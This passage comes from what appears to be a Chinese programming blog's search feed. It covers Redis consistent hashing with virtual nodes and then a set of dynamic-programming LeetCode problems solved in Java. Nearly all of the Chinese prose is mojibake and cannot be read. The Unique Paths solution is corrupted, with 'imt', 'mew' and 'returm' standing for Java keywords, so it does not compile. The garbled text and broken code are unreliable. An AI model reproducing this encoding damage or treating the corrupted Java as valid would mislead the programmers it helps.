¹æ®ç¯é¡ºæ—¶é’ˆè¡Œèµ°ï¼Œç¬¬ä¸€ä¸ªé‡åˆ°çš„æœåŠ¡å™¨å°±æ˜¯ç›®æ ‡å­˜å‚¨æœåŠ¡å™¨ã€‚</p><p><img src="/2020/03/25/redis/image-20200325162628890.png"></p><p>å‡è®¾nodeCå®•æœºï¼Œåªæœ‰NodeBåˆ°nodeCä¹‹é—´çš„æ•°æ®å—å½±å“ï¼Œæ–°æ¥çš„æ•°æ®éƒ½ä¼šæ²¿é¡ºæ—¶é’ˆå­˜å…¥nodeDï¼Œå› æ­¤å¯ä»¥åšåˆ°æœ€å°åŒ–æœ‰æŸæœåŠ¡ã€‚</p><h3><span id="æ–°å¢æœåŠ¡å™¨node-x">æ–°å¢æœåŠ¡å™¨Node X</span></h3><p><img src="/2020/03/25/redis/image-20200325162654114.png"></p><p>å—å½±å“çš„æ•°æ®ä¹Ÿåªæ˜¯nodeXåˆ°NodeBä¹‹é—´çš„æ•°æ®ã€‚</p><p>å—å½±å“çš„æ•°æ®æ˜¯æ–°æœåŠ¡å™¨åˆ°å…¶ç¯ç©ºé—´ä¸­å‰ä¸€å°æœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®</p><h3><span id="hashç¯çš„æ•°æ®å€¾æ–œé—®é¢˜">Hashç¯çš„æ•°æ®å€¾æ–œé—®é¢˜</span></h3><p><img src="/2020/03/25/redis/image-20200325162709515.png"></p><h3><span id="å¼•å…¥è™šæ‹ŸèŠ‚ç‚¹è§£å†³æ•°æ®å€¾æ–œçš„é—®é¢˜">å¼•å…¥è™šæ‹ŸèŠ‚ç‚¹è§£å†³æ•°æ®å€¾æ–œçš„é—®é¢˜</span></h3><p><img src="/2020/03/25/redis/image-20200325162823050.png"></p><p>å¯¹æ¯ä¸ªèŠ‚ç‚¹éƒ½è®¡ç®—å¤šä¸ªå“ˆå¸Œï¼ŒæœåŠ¡å™¨ipæˆ–è€…ä¸»æœºååé¢åŠ ç¼–å·å®ç°</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ¨æ€è§„åˆ’é›†åˆ</title>
      <link href="/2020/03/25/dp/"/>
      <url>/2020/03/25/dp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ‘˜å½•äº†ä¸€äº›ç»å…¸çš„åŠ¨æ€è§„åˆ’é¢˜</p><span id="more"></span><!-- toc --><ul><li><a href="#%E5%9F%BA%E6%9C%ACdp%E9%97%AE%E9%A2%98">åŸºæœ¬DPé—®é¢˜ï¼š</a><ul><li><a href="#70-climbing-stairs">70. Climbing Stairs âˆš</a></li><li><a href="#120-triangle">120. Triangle âˆš</a></li><li><a href="#53-maximum-subarray">53. Maximum Subarray âˆš</a></li><li><a href="#303-range-sum-query-immutable">303. Range Sum Query - Immutable âˆš</a></li><li><a href="#343-integer-break">343. Integer Break âˆš</a></li></ul></li><li><a href="#%E7%9F%A9%E5%BD%A2dp%E9%97%AE%E9%A2%98">çŸ©å½¢DPé—®é¢˜</a><ul><li><a href="#62-unique-paths">62. Unique Paths âˆš</a></li><li><a href="#64-minimum-path-sum">64. Minimum Path Sum âˆš</a></li><li><a href="#63-unique-paths-ii">63. Unique Paths II âˆš</a></li><li><a href="#221-maximal-square-">221. Maximal Square -</a></li></ul></li><li><a href="#%E5%BA%8F%E5%88%97%E7%B1%BB%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E9%97%AE%E9%A2%98">åºåˆ—ç±»åŠ¨æ€è§„åˆ’é—®é¢˜</a><ul><li><a href="#300-longest-increasing-subsequence">300. Longest Increasing Subsequence âˆš</a></li><li><a href="#leetcode-%E7%AC%AC-256-%E5%8F%B7%E9%97%AE%E9%A2%98%E7%B2%89%E5%88%B7%E6%88%BF%E5%AD%90">LeetCode ç¬¬ 256 å·é—®é¢˜ï¼šç²‰åˆ·æˆ¿å­ âˆš</a></li><li><a href="#198-house-robber">198. House Robber âˆš</a></li><li><a href="#leetcode-%E7%AC%AC-265-%E5%8F%B7%E9%97%AE%E9%A2%98%E7%B2%89%E5%88%B7%E6%88%BF%E5%AD%90ii">LeetCode ç¬¬ 265 å·é—®é¢˜ï¼šç²‰åˆ·æˆ¿å­II âˆš</a></li><li><a href="#213-house-robber-ii">213. House Robber II âˆš</a></li><li><a href="#413-arithmetic-slices">413. Arithmetic Slices âˆš</a></li><li><a href="#279-perfect-squares">279. Perfect Squares âˆš</a></li><li><a href="#91-decode-ways">91. Decode Ways Ã—</a></li></ul></li><li><a href="#%E5%8F%8C%E5%BA%8F%E5%88%97%E7%B1%BB%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%AD%97%E7%AC%A6%E5%8C%B9%E9%85%8D%E7%B1%BB">åŒåºåˆ—ç±»åŠ¨æ€è§„åˆ’ï¼šå­—ç¬¦åŒ¹é…ç±»</a><ul><li><a href="#1143-longest-common-subsequence-">1143. Longest Common Subsequence -</a></li><li><a href="#72-edit-distance">72. Edit Distance âˆš</a></li><li><a href="#44-wildcard-matching-">44. Wildcard Matching -</a></li><li><a href="#10-regular-expression-matching">10. Regular Expression Matching Ã—</a></li><li><a href="#97-interleaving-string">97. Interleaving String Ã—</a></li></ul></li><li><a href="#%E6%A6%82%E7%8E%87dp%E9%97%AE%E9%A2%98">æ¦‚ç‡DPé—®é¢˜</a><ul><li><a href="#4-%E4%BF%A1%E4%BB%B6%E9%94%99%E6%8E%92">4. ä¿¡ä»¶é”™æ’ Ã—</a></li><li><a href="#5-%E6%AF%8D%E7%89%9B%E7%94%9F%E4%BA%A7">5. æ¯ç‰›ç”Ÿäº§ âˆš</a></li></ul></li><li><a href="#%E5%90%84%E7%A7%8Dgame%E9%9B%86%E5%90%88">å„ç§Gameé›†åˆ</a><ul><li><a href="#1025-divisor-game">1025. Divisor Game Ã—</a></li><li><a href="#877-stone-game">877. Stone Game</a></li></ul></li><li><a href="#%E8%82%A1%E7%A5%A8%E9%97%AE%E9%A2%98%E7%8A%B6%E6%80%81%E6%9C%BA">è‚¡ç¥¨é—®é¢˜ï¼ˆçŠ¶æ€æœºï¼‰</a><ul><li><a href="#leetcode-121-best-time-to-buy-and-sell-stock">Leetcode 121 Best Time to Buy and Sell Stock âˆš</a></li><li><a href="#leetcode-122-best-time-to-buy-and-sell-stock-ii">Leetcode 122 Best Time to Buy and Sell Stock II âˆš</a></li><li><a href="#leetcode-123-best-time-to-buy-and-sell-stock-iii">Leetcode 123 Best Time to Buy and Sell Stock III âˆš</a></li><li><a href="#leetcode-188-best-time-to-buy-and-sell-stock-iv">Leetcode 188 Best Time to Buy and Sell Stock IV Ã—</a></li><li><a href="#leetcode-309-best-time-to-buy-and-sell-stock-with-cooldown">Leetcode 309 Best Time to Buy and Sell Stock with Cooldown âˆš</a></li><li><a href="#leetcode-714-best-time-to-buy-and-sell-stock-with-transcation-fee">Leetcode 714 Best Time to Buy and Sell Stock with Transcation Fee âˆš</a></li></ul></li></ul><!-- tocstop --><h1><span id="åŸºæœ¬dpé—®é¢˜">åŸºæœ¬DPé—®é¢˜ï¼š</span></h1><h2><span id="70-climbing-stairs">70. Climbing Stairs âˆš</span></h2><p>å‡è®¾ä½ æ­£åœ¨çˆ¬æ¥¼æ¢¯ã€‚éœ€è¦ <em>n</em> é˜¶ä½ æ‰èƒ½åˆ°è¾¾æ¥¼é¡¶ã€‚</p><p>æ¯æ¬¡ä½ å¯ä»¥çˆ¬ 1 æˆ– 2 ä¸ªå°é˜¶ã€‚ä½ æœ‰å¤šå°‘ç§ä¸åŒçš„æ–¹æ³•å¯ä»¥çˆ¬åˆ°æ¥¼é¡¶å‘¢ï¼Ÿ</p><p>æ³¨æ„ï¼šç»™å®š <em>n</em> æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚</p><p><strong>ç¤ºä¾‹</strong> <strong>1</strong>ï¼š</p><p> è¾“å…¥ï¼š2<br> è¾“å‡ºï¼š2<br> è§£é‡Šï¼š æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥çˆ¬åˆ°æ¥¼é¡¶ã€‚</p><ol><li>1 é˜¶ + 1 é˜¶</li><li>2 é˜¶</li></ol><p><strong>ç¤ºä¾‹</strong> <strong>2</strong>ï¼š</p><p> è¾“å…¥ï¼š3<br> è¾“å‡ºï¼š3<br> è§£é‡Šï¼š æœ‰ä¸‰ç§æ–¹æ³•å¯ä»¥çˆ¬åˆ°æ¥¼é¡¶ã€‚</p><ol><li>1 é˜¶ + 1 é˜¶ + 1 é˜¶</li><li>1 é˜¶ + 2 é˜¶</li><li>2 é˜¶ + 1 é˜¶</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="120-triangle">120. Triangle âˆš</span></h2><p>ç»™å®šä¸€ä¸ªä¸‰è§’å½¢ï¼Œæ‰¾å‡ºè‡ªé¡¶å‘ä¸‹çš„æœ€å°è·¯å¾„å’Œã€‚æ¯ä¸€æ­¥åªèƒ½ç§»åŠ¨åˆ°ä¸‹ä¸€è¡Œä¸­ç›¸é‚»çš„ç»“ç‚¹ä¸Šã€‚</p><p>ä¾‹å¦‚ï¼Œç»™å®šä¸‰è§’å½¢ï¼š</p><p>[<br>     [2],<br>    [3,4],<br>   [6,5,7],<br>  [4,1,8,3]<br> ]</p><p>è‡ªé¡¶å‘ä¸‹çš„æœ€å°è·¯å¾„å’Œä¸º 11ï¼ˆå³ï¼Œ2 + 3 + 5 + 1 &#x3D; 11ï¼‰ã€‚</p><p><strong>è¯´æ˜ï¼š</strong></p><p>å¦‚æœä½ å¯ä»¥åªä½¿ç”¨ O(n) çš„é¢å¤–ç©ºé—´ï¼ˆn ä¸ºä¸‰è§’å½¢çš„æ€»è¡Œæ•°ï¼‰æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œé‚£ä¹ˆä½ çš„ç®—æ³•ä¼šå¾ˆåŠ åˆ†ã€‚</p><p>äºŒç»´dpè§£æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[][]dp;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minimumTotal</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; triangle)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> triangle.size();</span><br><span class="line">        dp = <span class="keyword">new</span> <span class="title class_">int</span>[len][len];</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">           dp[len-<span class="number">1</span>][i] = triangle.get(len-<span class="number">1</span>).get(i);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=len-<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line">               dp[i][j]=triangle.get(i).get(j)+Math.min(dp[i+<span class="number">1</span>][j],dp[i+<span class="number">1</span>][j+<span class="number">1</span>]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å¦‚ä½•é™ç»´æ‰“å‡»å‘¢ï¼Ÿå¦‚æœçœ‹è¿‡èƒŒåŒ…é—®é¢˜å°±ä¸éš¾å›ç­”äº†ã€‚dp[i][j]&lt;â€”dp[i+1][j] , dp[i+1][j+1]ã€‚</p><p>å› æ­¤æ­£åºéå†çš„è¯åªä¼šæ”¹å˜dp[i]çš„å€¼ï¼Œå¯¹dp[i+1]çš„å€¼æ²¡æœ‰ä»»ä½•å½±å“ï¼Œæ‰€ä»¥æˆ‘ä»¬é™ç»´æ‰“å‡»åº”è¯¥é‡‡å–æ­£å‘éå†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minimumTotal</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; triangle)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> triangle.get(triangle.size()-<span class="number">1</span>).size();</span><br><span class="line">        <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            dp[i]=triangle.get(len-<span class="number">1</span>).get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=len-<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;triangle.get(i).size();j++)</span><br><span class="line">                dp[j]=Math.min(dp[j],dp[j+<span class="number">1</span>])+triangle.get(i).get(j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="53-maximum-subarray">53. Maximum Subarray âˆš</span></h2><p>ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ <em>nums</em> ï¼Œæ‰¾åˆ°ä¸€ä¸ªå…·æœ‰æœ€å¤§å’Œçš„è¿ç»­å­æ•°ç»„ï¼ˆå­æ•°ç»„æœ€å°‘åŒ…å«ä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œè¿”å›å…¶æœ€å¤§å’Œã€‚</p><p><strong>ç¤ºä¾‹</strong>:</p><p>è¾“å…¥: [-2,1,-3,4,-1,2,1,-5,4],<br> è¾“å‡º: 6<br> è§£é‡Š: è¿ç»­å­æ•°ç»„ [4,-1,2,1] çš„å’Œæœ€å¤§ï¼Œä¸º 6ã€‚</p><p>**è¿›é˜¶:</p><p>å¦‚æœä½ å·²ç»å®ç°å¤æ‚åº¦ä¸º O(n) çš„è§£æ³•ï¼Œå°è¯•ä½¿ç”¨æ›´ä¸ºç²¾å¦™çš„åˆ†æ²»æ³•æ±‚è§£ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums==<span class="literal">null</span>||nums.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        <span class="type">int</span> res=nums[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">            dp[i]=nums[i]&gt;nums[i]+dp[i-<span class="number">1</span>]?nums[i]:nums[i]+dp[i-<span class="number">1</span>];</span><br><span class="line">            res=Math.max(dp[i],res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶å®å¯ä»¥å¤šå¼€1ä¸ªç©ºé—´å»ä¼˜åŒ–ä»£ç é•¿åº¦ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length+<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=nums.length;i++)&#123;</span><br><span class="line">        dp[i]=Math.max(dp[i-<span class="number">1</span>]+nums[i-<span class="number">1</span>],nums[i-<span class="number">1</span>]);</span><br><span class="line">        res = res&lt;dp[i]?dp[i]:res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°dp[i]å…¶å®ä¾èµ–åªäºdp[i-1]ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦ä¸¤ä¸ªå˜é‡è¶³ä»¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">curMax</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            curMax = Math.max(nums[i],nums[i]+curMax);</span><br><span class="line">            max = Math.max(max,curMax);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="303-range-sum-query-immutable">303. Range Sum Query - Immutable âˆš</span></h2><p>Given an integer array <em>nums</em>, find the sum of the elements between indices <em>i</em> and <em>j</em> (<em>i</em> â‰¤ <em>j</em>), inclusive.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [-2, 0, 3, -5, 2, -1]</span><br><span class="line"></span><br><span class="line">sumRange(0, 2) -&gt; 1</span><br><span class="line">sumRange(2, 5) -&gt; -1</span><br><span class="line">sumRange(0, 5) -&gt; -3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] res;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">NumArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    res = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">    <span class="type">int</span> rec=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i:nums)&#123;</span><br><span class="line">        rec+=i;</span><br><span class="line">        res[j]=rec;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumRange</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res[j]- (i-<span class="number">1</span>&gt;=<span class="number">0</span>?res[i-<span class="number">1</span>]:<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="343-integer-break">343. Integer Break âˆš</span></h2><p>Given a positive integer <em>n</em>, break it into the sum of <strong>at least</strong> two positive integers and maximize the product of those integers. Return the maximum product you can get.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 2</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: 2 = 1 + 1, 1 Ã— 1 = 1.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 10</span><br><span class="line">Output: 36</span><br><span class="line">Explanation: 10 = 3 + 3 + 4, 3 Ã— 3 Ã— 4 = 36.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">integerBreak</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> dp[]=<span class="keyword">new</span> <span class="title class_">int</span>[n+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">2</span>;j&lt;i;j++)&#123;</span><br><span class="line">            dp[i]=Math.max(Math.max((i-j)*dp[j],(i-j)*j),dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="çŸ©å½¢dpé—®é¢˜">çŸ©å½¢DPé—®é¢˜</span></h1><h2><span id="62-unique-paths">62. Unique Paths âˆš</span></h2><p>ä¸€ä¸ªæœºå™¨äººä½äºä¸€ä¸ª <em>m x n</em> ç½‘æ ¼çš„å·¦ä¸Šè§’ ï¼ˆèµ·å§‹ç‚¹åœ¨ä¸‹å›¾ä¸­æ ‡è®°ä¸ºâ€œStartâ€ ï¼‰ã€‚</p><p>æœºå™¨äººæ¯æ¬¡åªèƒ½å‘ä¸‹æˆ–è€…å‘å³ç§»åŠ¨ä¸€æ­¥ã€‚æœºå™¨äººè¯•å›¾è¾¾åˆ°ç½‘æ ¼çš„å³ä¸‹è§’ï¼ˆåœ¨ä¸‹å›¾ä¸­æ ‡è®°ä¸ºâ€œFinishâ€ï¼‰ã€‚</p><p>é—®æ€»å…±æœ‰å¤šå°‘æ¡ä¸åŒçš„è·¯å¾„ï¼Ÿ</p><p><img src="/2020/03/25/dp/clip_image001.png"><br> Above is a 7 x 3 grid. How many possible unique paths are there?</p><p>ä¾‹å¦‚ï¼Œä¸Šå›¾æ˜¯ä¸€ä¸ª7 x 3 çš„ç½‘æ ¼ã€‚æœ‰å¤šå°‘å¯èƒ½çš„è·¯å¾„ï¼Ÿ</p><p><strong>è¯´æ˜ï¼š</strong> <em>m</em> å’Œ <em>n</em> çš„å€¼å‡ä¸è¶…è¿‡ 100ã€‚</p><p><strong>ç¤ºä¾‹</strong> <strong>1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: m = 3, n = 2</span><br><span class="line">è¾“å‡º: 3</span><br><span class="line">è§£é‡Š:</span><br><span class="line">ä»å·¦ä¸Šè§’å¼€å§‹ï¼Œæ€»å…±æœ‰ 3 æ¡è·¯å¾„å¯ä»¥åˆ°è¾¾å³ä¸‹è§’ã€‚</span><br><span class="line"></span><br><span class="line">1. å‘å³ -&gt; å‘å³ -&gt; å‘ä¸‹</span><br><span class="line">2. å‘å³ -&gt; å‘ä¸‹ -&gt; å‘å³</span><br><span class="line">3. å‘ä¸‹ -&gt; å‘å³ -&gt; å‘å³</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹</strong> <strong>2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: m = 7, n = 3</span><br><span class="line">è¾“å‡º: 28</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> imt <span class="title function_">umiquePaths</span><span class="params">(imt m, imt n)</span> &#123;</span><br><span class="line">    imt[][] dp = mew imt[n][m];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">imt</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">imt</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; m; ++j) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">imt</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">imt</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; m; ++j) &#123;</span><br><span class="line">            dp[i][j] = dp[i - <span class="number">1</span>][j] + dp[i][j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    returm dp[n - <span class="number">1</span>][m - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™ç»´æ‰“å‡»ï¼š</p><p>è¿˜æ˜¯åˆ†æä¸€ä¸‹dp[i][j]ä¾èµ–äºdp[i][j]å½“å‰è¡Œçš„å·¦è¾¹å…ƒç´ å’Œdp[i-1][j]ä¸Šä¸€è¡Œçš„å…ƒç´ ï¼Œå› 